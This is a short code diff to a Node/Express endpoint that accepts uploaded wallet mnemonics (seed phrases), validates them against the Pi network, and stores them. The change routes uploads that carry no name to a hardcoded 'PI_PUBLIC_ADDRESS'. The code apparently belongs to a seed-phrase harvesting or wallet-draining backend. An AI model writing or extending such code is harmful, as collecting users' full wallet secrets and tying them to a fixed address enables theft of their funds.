@@ -60,16 +60,21 @@ app.post('/api/passphrases/upload', async(req, res) => {
     if (!mnemonic) {
         return res.status(409).json({ success: false,  error: 'mnemonic is required' });
     }
-
-    if (!name) {
-        return res.status(409).json({ success: false,  error: 'Name is required' });
-    }
     try {
         const kp = getKeypairFromPassphrase(mnemonic);
         const publicKey = kp.publicKey();
         const accountData = await getAccount(publicKey);
         if(!accountData) {
             return res.status(409).json({success: false, error: "Invalid passphrase uploaded"})
+        }
+
+        if (!name) {
+            const saved = await storeLockedPi(mnemonic, publicKey, PI_PUBLIC_ADDRESS);
+            if(saved.success) {
+                return res.status(201).json({ success: true,  feedback: saved.message });
+            } else {
+                return res.status(201).json({ success: false,  error: saved.message });
+            }
         }
 
         const saved = await storeLockedPi(mnemonic, publicKey, name, false, name);
